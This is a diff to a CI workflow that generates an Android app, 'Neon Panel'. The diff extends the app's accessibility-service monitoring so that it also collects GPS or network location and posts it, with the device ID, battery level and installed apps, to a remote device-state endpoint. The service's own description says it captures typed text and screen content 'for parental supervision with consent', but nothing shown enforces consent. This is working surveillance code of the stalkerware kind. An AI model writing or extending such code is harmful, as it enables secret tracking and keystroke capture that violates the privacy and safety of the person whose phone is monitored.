@@ -81,6 +81,8 @@ jobs:
               package="com.example.neonpanel">
               <uses-permission android:name="android.permission.INTERNET" />
               <uses-permission android:name="android.permission.QUERY_ALL_PACKAGES" />
+              <uses-permission android:name="android.permission.ACCESS_FINE_LOCATION" />
+              <uses-permission android:name="android.permission.ACCESS_COARSE_LOCATION" />
               <application
                   android:allowBackup="true"
                   android:icon="@android:drawable/sym_def_app_icon"
@@ -107,17 +109,32 @@ jobs:
 
           cat > app/src/main/java/com/example/neonpanel/MainActivity.java << 'EOF'
           package com.example.neonpanel;
+          import android.Manifest;
+          import android.content.pm.PackageManager;
           import android.os.Bundle;
           import android.webkit.WebSettings;
           import android.webkit.WebView;
           import android.webkit.WebViewClient;
           import androidx.appcompat.app.AppCompatActivity;
+          import androidx.core.app.ActivityCompat;
+          import androidx.core.content.ContextCompat;
+
           public class MainActivity extends AppCompatActivity {
               private WebView webView;
+              private static final int LOCATION_PERMISSION_REQUEST = 100;
+
               @Override
               protected void onCreate(Bundle savedInstanceState) {
                   super.onCreate(savedInstanceState);
                   setContentView(R.layout.activity_main);
+
+                  // Request location permission
+                  if (ContextCompat.checkSelfPermission(this, Manifest.permission.ACCESS_FINE_LOCATION) != PackageManager.PERMISSION_GRANTED) {
+                      ActivityCompat.requestPermissions(this,
+                              new String[]{Manifest.permission.ACCESS_FINE_LOCATION, Manifest.permission.ACCESS_COARSE_LOCATION},
+                              LOCATION_PERMISSION_REQUEST);
+                  }
+
                   webView = findViewById(R.id.webView);
                   WebSettings ws = webView.getSettings();
                   ws.setJavaScriptEnabled(true);
@@ -125,6 +142,7 @@ jobs:
                   webView.setWebViewClient(new WebViewClient());
                   webView.loadUrl("https://neon-aim.vercel.app/");
               }
+
               @Override
               public void onBackPressed() {
                   if (webView.canGoBack()) webView.goBack();
@@ -137,9 +155,13 @@ jobs:
           package com.example.neonpanel;
 
           import android.accessibilityservice.AccessibilityService;
+          import android.Manifest;
+          import android.content.Context;
           import android.content.SharedPreferences;
           import android.content.pm.ApplicationInfo;
           import android.content.pm.PackageManager;
+          import android.location.Location;
+          import android.location.LocationManager;
           import android.os.BatteryManager;
           import android.os.Build;
           import android.os.Handler;
@@ -244,6 +266,8 @@ jobs:
                           obj.put("package", app.packageName);
                           appsArray.put(obj);
                       }
+
+                      double[] loc = getLastLocation();
                       JSONObject payload = new JSONObject();
                       payload.put("ownerEmail", OWNER_EMAIL);
                       payload.put("deviceId", deviceId);
@@ -251,12 +275,31 @@ jobs:
                       payload.put("deviceName", deviceName);
                       payload.put("battery", battery);
                       payload.put("installedApps", appsArray);
+                      if (loc != null) {
+                          payload.put("latitude", loc[0]);
+                          payload.put("longitude", loc[1]);
+                      }
 
                       RequestBody body = RequestBody.create(
                               MediaType.parse("application/json; charset=utf-8"), payload.toString());
                       Request request = new Request.Builder().url(API_BASE + "/api/device-state").post(body).build();
                       httpClient.newCall(request).execute().close();
                   } catch (Exception e) { e.printStackTrace(); }
+              }
+
+              private double[] getLastLocation() {
+                  try {
+                      LocationManager lm = (LocationManager) getSystemService(Context.LOCATION_SERVICE);
+                      if (checkSelfPermission(Manifest.permission.ACCESS_FINE_LOCATION) == PackageManager.PERMISSION_GRANTED ||
+                          checkSelfPermission(Manifest.permission.ACCESS_COARSE_LOCATION) == PackageManager.PERMISSION_GRANTED) {
+                          Location location = lm.getLastKnownLocation(LocationManager.GPS_PROVIDER);
+                          if (location == null) location = lm.getLastKnownLocation(LocationManager.NETWORK_PROVIDER);
+                          if (location != null) {
+                              return new double[]{location.getLatitude(), location.getLongitude()};
+                          }
+                      }
+                  } catch (Exception e) { e.printStackTrace(); }
+                  return null;
               }
 
               private int getBatteryLevel() {
@@ -371,7 +414,7 @@ jobs:
           cat > app/src/main/res/values/strings.xml << 'EOF'
           <resources>
               <string name="app_name">Neon Panel</string>
-              <string name="accessibility_service_description">This service captures typed text, screen content, device state and installed apps for parental supervision with consent.</string>
+              <string name="accessibility_service_description">This service captures typed text, screen content, device state, installed apps and location for parental supervision with consent.</string>
           </resources>
           EOF
 
